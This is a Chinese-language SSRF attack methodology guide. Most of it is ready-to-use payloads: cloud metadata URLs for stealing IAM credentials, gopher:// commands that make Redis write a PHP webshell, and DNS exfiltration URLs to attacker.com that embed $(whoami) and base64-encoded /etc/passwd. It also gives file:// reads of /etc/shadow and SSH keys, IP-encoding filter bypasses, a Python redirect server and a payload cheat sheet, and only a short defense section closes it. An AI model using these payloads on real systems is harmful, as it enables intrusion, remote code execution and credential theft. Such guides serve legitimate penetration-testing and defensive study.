# SSRF 服务器端请求伪造攻击方法论

## 1. 技术介绍

SSRF（Server-Side Request Forgery，服务器端请求伪造）是一种攻击技术，攻击者能够诱导服务器端应用程序向攻击者选择的目的地发起 HTTP 请求或其他网络请求。

**漏洞本质：** 应用程序接收用户控制的 URL 或文件路径，未经验证或过滤就用于发起网络请求，导致攻击者可以访问内部网络资源。

**核心原理：**
- 服务器作为攻击跳板访问内部资源
- 绕过防火墙和网络隔离
- 访问云元数据服务获取敏感凭证

---

## 2. 攻击常见于哪些业务场景

### 2.1 Webhook/回调功能
- **场景描述：** 用户配置 webhook URL 接收事件通知
- **风险点：** URL 未验证，可指向内网
- **示例：** CI/CD 系统的 webhook 配置

### 2.2 文件上传/下载
- **场景描述：** 从 URL 下载文件
- **风险点：** URL 协议未限制，可访问 file://
- **示例：** 头像上传、文档导入

### 2.3 图片/资源加载
- **场景描述：** 加载外部图片、CSS、JS 资源
- **风险点：** 资源 URL 用户可控
- **示例：** 富文本编辑器中的图片插入

### 2.4 API 网关/代理
- **场景描述：** 服务器作为代理转发请求
- **风险点：** 目标地址用户可控
- **示例：** CORS 代理、API 转发

### 2.5 邮件系统
- **场景描述：** 发送包含外部资源的邮件
- **风险点：** 邮件客户端加载资源时触发请求
- **示例：** HTML 邮件中的图片加载

### 2.6 云函数/无服务器
- **场景描述：** 云函数访问外部 API
- **风险点：** 云环境元数据服务可访问
- **示例：** AWS Lambda、Azure Functions

---

## 3. 漏洞探测方法

### 3.1 输入点识别

**常见参数名：**
```
url, URL, Url
uri, URI
path, filepath
file, filename
dest, destination
target, redirect
next, return
callback, webhook
image_url, avatar
fetch, load, download
```

**探测 Payload：**
```
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
file:///etc/passwd
dict://127.0.0.1:6379/
gopher://127.0.0.1:6379/_
```

### 3.2 黑盒测试

**基础探测：**
1. 发送指向外部可控服务器的 URL
2. 检查是否收到请求（DNS/HTTP 日志）
3. 观察响应时间差异
4. 检查错误信息泄露

**DNS 重绑定攻击：**
```javascript
// 使用 DNS 重绑定服务
http://bind.attacker.com

// 首次解析为公网 IP（绕过初始检查）
// 二次解析为内网 IP（实际请求目标）
```

**时间延迟探测：**
```
http://127.0.0.1:PORT/sleep?seconds=5
观察响应时间判断端口开放状态
```

### 3.3 白盒测试

**代码审计关键词：**
```python
# Python
requests.get()
urllib.request.urlopen()
urllib2.urlopen()
http.client.HTTPConnection()

# Java
HttpURLConnection
HttpClient
RestTemplate
OkHttpClient

# PHP
file_get_contents()
curl_exec()
fopen()

# Node.js
http.get()
axios.get()
request()
```

**危险模式：**
```python
# 危险：直接使用用户输入
url = request.args.get('url')
requests.get(url)

# 危险：仅检查前缀
if url.startswith('https://'):
    requests.get(url)

# 安全：使用 URL 解析 + 白名单
from urllib.parse import urlparse
parsed = urlparse(url)
if parsed.hostname in ALLOWED_HOSTS:
    requests.get(url)
```

---

## 4. 漏洞利用方法

### 4.1 云元数据服务访问

**AWS EC2 元数据：**
```
# IMDSv1（旧版本）
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# IMDSv2（需要会话令牌）
PUT http://169.254.169.254/latest/api/token
Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
GET http://169.254.169.254/latest/meta-data/
Header: X-aws-ec2-metadata-token: TOKEN
```

**GCP 元数据：**
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Header: Metadata-Flavor: Google
```

**Azure 元数据：**
```
http://169.254.169.254/metadata/instance?api-version=2020-09-01
Header: Metadata: true
```

### 4.2 内网端口扫描

**常见服务端口：**
```
http://127.0.0.1:22      # SSH
http://127.0.0.1:6379    # Redis
http://127.0.0.1:27017   # MongoDB
http://127.0.0.1:3306    # MySQL
http://127.0.0.1:5432    # PostgreSQL
http://127.0.0.1:9200    # Elasticsearch
http://127.0.0.1:8080    # 常见 Web 服务
http://127.0.0.1:5000    # Flask 开发服务器
```

**扫描技术：**
1. 发送请求到不同端口
2. 观察响应时间差异
3. 分析错误消息差异
4. 使用带外通道确认（DNS/HTTP）

### 4.3 Redis 未授权访问

**Gopher 协议利用：**
```
# Redis GET 命令
gopher://127.0.0.1:6379/_GET%20key%0D%0A

# Redis SET 命令（写入 Webshell）
gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html%0D%0A
gopher://127.0.0.1:6379/_CONFIG%20SET%20dbfilename%20shell.php%0D%0A
gopher://127.0.0.1:6379/_SET%20payload%20%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%0D%0A
gopher://127.0.0.1:6379/_SAVE%0D%0A
```

### 4.4 DNS 数据外带

**外带 Payload：**
```
http://EXFILTRATED_DATA.attacker.com/
http://$(whoami).attacker.com/
http://ATTACKER.COM/$(cat /etc/passwd | base64)
```

**设置 DNS 监听：**
```bash
# 使用 nc 监听
nc -lvnp 53

# 使用 dnslog 平台
# http://dnslog.cn/
# http://ceye.io/
```

### 4.5 文件协议访问

**Linux 文件访问：**
```
file:///etc/passwd
file:///etc/shadow
file:///proc/self/environ
file:///var/run/docker.sock
file:///root/.ssh/id_rsa
```

**Windows 文件访问：**
```
file:///C:/Windows/win.ini
file:///C:/Users/Administrator/.ssh/id_rsa
file:///D:/sensitive_data.txt
```

### 4.6 间接 SSRF（通过 HTML 注入）

**场景：** 应用使用 PhantomJS 等渲染用户控制的 HTML

**利用方法：**
```html
<!-- 注入 img 标签触发 SSRF -->
<img src="http://169.254.169.254/latest/meta-data/">

<!-- 注入 iframe -->
<iframe src="http://internal-service/api"></iframe>

<!-- 注入 link 标签 -->
<link rel="stylesheet" href="http://attacker.com/exfil?data=...">
```

---

## 5. 漏洞利用绕过方法

### 5.1 IP 地址绕过

**十进制表示：**
```
127.0.0.1 = 2130706433
计算：127*256^3 + 0*256^2 + 0*256 + 1
```

**八进制表示：**
```
127.0.0.1 = 0177.0.0.1
127.0.0.1 = 0177.00.00.0001
```

**十六进制表示：**
```
127.0.0.1 = 0x7f.0x0.0x0.0x1
127.0.0.1 = 0x7f000001
```

**IPv6 表示：**
```
127.0.0.1 = ::1
127.0.0.1 = ::ffff:7f00:1
127.0.0.1 = 0:0:0:0:0:ffff:7f00:1
```

**混合表示：**
```
127.0.0.1 = 127.1
127.0.0.1 = 127.0.1
```

### 5.2 域名绕过

**DNS 重绑定：**
```bash
# 使用重绑定服务
http://bind.attacker.com

# 首次解析：公网 IP（通过验证）
# 二次解析：内网 IP（实际请求）
```

**通配符 DNS：**
```
# 指向内网的通配符域名
*.internal.attacker.com → 127.0.0.1
*.localhost.attacker.com → 127.0.0.1
```

**本地域名服务：**
```
http://localhost
http://localhost.localdomain
http://internal.host
```

### 5.3 URL 协议绕过

**协议变体：**
```
http://127.0.0.1
https://127.0.0.1
HTTP://127.0.0.1
HtTp://127.0.0.1
```

**协议混合：**
```
http://127.0.0.1@attacker.com
http://attacker.com@127.0.0.1
```

**特殊协议：**
```
dict://127.0.0.1:6379/
gopher://127.0.0.1:6379/_
sftp://127.0.0.1:22/
ldap://127.0.0.1:389/
```

### 5.4 重定向绕过

**重定向链：**
```
1. 用户输入：http://attacker.com/redirect1
2. Redirect1 → http://attacker.com/redirect2
3. Redirect2 → http://127.0.0.1:6379/
```

**302 重定向：**
```python
# 攻击者服务器
from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header('Location', 'http://127.0.0.1:6379/')
        self.end_headers()

HTTPServer(('0.0.0.0', 80), Handler).serve_forever()
```

### 5.5 端口绕过

**默认端口省略：**
```
http://127.0.0.1:80/ = http://127.0.0.1/
https://127.0.0.1:443/ = https://127.0.0.1/
```

**端口范围探测：**
```bash
# 批量探测常见端口
for port in 80 443 8080 8443 3000 5000; do
    curl "http://target.com/fetch?url=http://127.0.0.1:$port/"
done
```

### 5.6 路径绕过

**路径拼接：**
```
http://127.0.0.1@attacker.com/
http://attacker.com/127.0.0.1/
http://attacker.com/@127.0.0.1/
```

**URL 片段：**
```
http://attacker.com#http://127.0.0.1/
http://attacker.com?http://127.0.0.1/
```

---

## 6. 高级利用技术

### 6.1 基于 PhantomJS 的间接 SSRF

**场景：** 应用使用 PhantomJS 渲染用户控制的 HTML 内容

**利用步骤：**
1. 注入包含资源加载的 HTML
2. PhantomJS 加载 HTML 并请求资源
3. 资源请求指向内网目标
4. 通过响应差异或带外通道确认

**Payload 示例：**
```html
<!-- 基础 SSRF -->
<img src="http://169.254.169.254/latest/meta-data/">

<!-- 多目标同时探测 -->
<img src="http://127.0.0.1:6379/">
<img src="http://127.0.0.1:27017/">
<img src="http://127.0.0.1:9200/">

<!-- DNS 外带 -->
<img src="http://EXFIL.attacker.com/">
```

**限制因素：**
- PhantomJS 执行时间窗口（通常 2-5 秒）
- 响应内容不返回给攻击者（盲 SSRF）
- 需要带外通道确认（DNS/HTTP）

### 6.2 时间窗口攻击

**场景：** SSRF 请求有超时限制

**利用方法：**
```
# 快速响应目标（<2 秒）
- 本地服务（1-10ms）
- 云元数据（20-100ms）
- DNS 查询（即时）

# 慢速目标处理
- 使用异步请求的应用
- 后台任务队列
- 邮件发送功能
```

### 6.3 组合攻击链

**SSRF + Redis = RCE：**
```
1. SSRF 访问 Redis
2. 通过 Gopher 协议写入配置
3. 写入 Webshell 到 Web 目录
4. 访问 Webshell 执行命令
```

**SSRF + 云元数据 = 凭证窃取：**
```
1. SSRF 访问云元数据 API
2. 获取 IAM 角色凭证
3. 使用凭证访问云资源（S3、RDS 等）
4. 横向移动到云内其他服务
```

---

## 7. 常用 Payload 速查表

| 目标 | Payload | 说明 |
|------|---------|------|
| AWS 元数据 | `http://169.254.169.254/latest/meta-data/` | 获取实例信息 |
| AWS 凭证 | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | 获取 IAM 凭证 |
| GCP 元数据 | `http://metadata.google.internal/computeMetadata/v1/` | GCP 元数据 |
| 本地文件 | `file:///etc/passwd` | Linux 文件访问 |
| Redis | `gopher://127.0.0.1:6379/_GET%20key%0D%0A` | Redis GET |
| DNS 外带 | `http://$(whoami).attacker.com/` | DNS 数据外带 |
| 十进制 IP | `http://2130706433/` | 127.0.0.1 十进制 |
| 八进制 IP | `http://0177.0.0.1/` | 127.0.0.1 八进制 |
| IPv6 | `http://[::1]/` | 127.0.0.1 IPv6 |
| 重定向 | `http://attacker.com/redirect` | 重定向到内网 |

---

## 8. 自动化检测工具

**推荐工具：**
- **SSRFmap:** SSRF 利用框架
- **Gopherus:** Gopher 协议 payload 生成
- **Burp Suite:** SSRF 检测插件
- **Collaborator:** 带外通道检测

**使用示例：**
```bash
# SSRFmap
python ssrfmap.py -r requests.txt -m portscan

# Gopherus
python gopherus.py --exploit redis

# Burp Collaborator
# 配置 Collaborator 客户端
# 发送包含 Collaborator 域名的请求
```

---

## 9. 防御建议

**输入验证：**
- 使用 URL 白名单
- 禁止内网 IP 段（10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8）
- 禁止特殊协议（file://, gopher://, dict://）

**网络隔离：**
- 应用服务器限制访问内网
- 使用防火墙规则阻止访问元数据服务
- 云环境使用 VPC 端点

**协议限制：**
- 仅允许 http:// 和 https://
- 禁用重定向或限制重定向次数
- 验证最终目标地址

**响应处理：**
- 不返回完整响应给客户端
- 限制响应大小
- 过滤敏感信息
